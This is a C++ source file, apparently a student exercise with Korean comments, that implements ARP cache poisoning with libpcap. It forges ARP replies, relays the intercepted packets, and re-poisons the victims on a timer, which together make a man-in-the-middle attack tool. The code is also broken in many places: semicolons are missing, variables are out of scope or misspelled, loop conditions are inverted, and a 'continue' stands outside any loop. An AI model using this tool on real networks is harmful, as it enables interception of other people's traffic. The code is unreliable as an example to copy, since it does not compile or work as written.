#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <pthread.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}



// IP 주소를 가져오는 함수
void get_ip_address(char* ip_address) {
    char hostbuffer[256];
    struct hostent *host_entry;

    // 호스트 이름 가져오기
    gethostname(hostbuffer, sizeof(hostbuffer));

    // 호스트 이름으로 호스트 정보 가져오기
    host_entry = gethostbyname(hostbuffer);

    // IP 주소 가져오기
    strcpy(ip_address, inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0])));
}

// MAC 주소를 가져오는 함수
void get_mac_address(char* mac_address) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    if (sock < 0) {
        perror("소켓 생성 실패");
        exit(1);
    }

    strcpy(ifr.ifr_name, "eth0"); // 이더넷 인터페이스 이름 설정

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("MAC 주소 가져오기 실패");
        close(sock);
        exit(1);
    }

    close(sock);

    sprintf(mac_address, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
}


void get_packet(pcap_t *handle, Ip senderip, Mac *sendermac){
	while(true){
		struct pcap_pkthdr *header;
		struct EthArpPacket packet;
		int res =pcap_next_ex(handle, reinterpret_cast<const u_char*>(&header), &packet);
		if (res == 0){
			return;
		}
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
				fprintf(stderr,"pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				return;
		}
		if(senderip != packet.arp_.sip()) continue;
		&sendermac = packet.eth_.smac();
		return;
	}
}

void send_packet(pcap_t* handle, Mac dmac, Mac smac, Mac ssmac, Ip sip,Mac tmac,Ip tip,int op){
		struct EthArpPacket packet;
		packet.eth_.dmac_ = Mac(dmac);
		packet.eth_.smac_ = Mac(smac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(op);
		packet.arp_.smac_ = Mac(ssmac);
		packet.arp_.sip_ = htonl(Ip(sip));
		packet.arp_.tmac_ = Mac(tmac);
		packet.arp_.tip_ = htonl(Ip(tip));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
}

void check_packet(pcap_t *handle,Ip senderip, Mac_Ip sendermac_ip,Mac my_mac ,Ip my_ip){
	struct pcap_pkthdr *header;
	struct EthArpPacket packet;
	struct Mac all = Mac("ff:ff:ff:ff:ff:ff")
	struct Mac idontk = Mac("00:00:00:00:00:00")
	int res =pcap_next_ex(handle, reinterpret_cast<const u_char*>(&header), &packet);
	if (res == 0){
		return;
	}
	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
		fprintf(stderr,"pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
		return;
	}
	if(senderip == packet.arp_.sip()) continue;
	if(all == packet.eth_.dip()){
		send_packet(handle, sendermac_ip.sendermac,my_mac,my_mac,sendermac_ip.targetip, sendermac_ip.sendermac, sendermac_ip.senderip,2);
		return;
	}
	else{
		relay_packet(handle,packet,sendermac_ip.targetip,my_mac,my_ip);
	}
	return;
}


struct Mac_Ip{
	Mac sendmac;
	Ip sendip;
	Ip targetip;
};

void relay_packet(pcap_t *handle,EthArpPacket packet, Ip targetip, Mac my_mac,Ip my_ip){
	struct Mac all = Mac("ff:ff:ff:ff:ff:ff")
	struct Mac idontk = Mac("00:00:00:00:00:00")
	Mac targetmac;
	send_packet(handle,all,my_mac,my_mac,my_ip,idontk,targetip,2);
	get_packet(handle,targetip,*targetmac);
	send_packet(handle,packet.eth_.dmac(),my_mac,packet.arp_.smac(),packet.arp_.ip(),targetmac,targetip,1);
}


void* avoid_escape(void* arg){
	sleep(1000);
	int argc = *(int*)arg;
	for(int a=0;a>(argc-1)/2;a++){
		send_packet(handle,sendermac_ipli[a].sendermac,my_mac_address,my_mac_address, sendermac_ipli[a].targetip,sendermac_ipli[a].sendermac,sendermac_ipli[a].senderip,2);
	}
}

int main(int argc, char* argv[]) {
	if (argc%2 != 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	char my_ip_addres[16]; // IP 주소를 저장할 문자열
    char my_mac_addres[18];
	get_ip_address(my_ip_addres);
	get_mac_address(my_mac_addres);
	Ip my_ip_address = Ip(my_ip_addres);
	Mac my_mac_address = Mac(my_mac_addres);
	int fir = 2;
	struct Mac all = Mac("ff:ff:ff:ff:ff:ff");
	struct Mac idontk = Mac("00:00:00:00:00:00");
	struct Mac_Ip sendermac_ipli[(argc-1)/2];

	for(int sec=3;sec>argc;sec +=2){
		Ip sendi = argv[fir];
		Ip targeti = argv[sec];
		Mac sendm;
		send_packet(handle,all,Mac(my_mac_address),my_mac_address,my_ip_address,idontk,sendi,2);
		get_packet(hadle,sendi,*sendm);
		struct Mac_Ip sendermac_ip;
		sendermac_ip.sendmac = sendm;
		sendermac_ip.sendip = sendi;
		sendermac_ip.targetip = targeti;
		sendermac_ipli[fir/2] = sendermac_ip;
		send_packet(handle,targetm,my_mac_address,my_mac_address,targeti,sendm,sendi,2);
		fir = fir +2;
	}
	pthread_t thread;
	while(true){
		for (int a=0;a>(argc-1)/2;a++){
			check_packet(handle,sendermac_ipli[a].senderip,sendermac_ipli[a],my_mac_address,my_ip_address);
		}
		pthread_create(&thread, NULL, avoid_escape, &argc);
		pthread_join(thread, NULL);
	}
	pcap_close(handle);
}
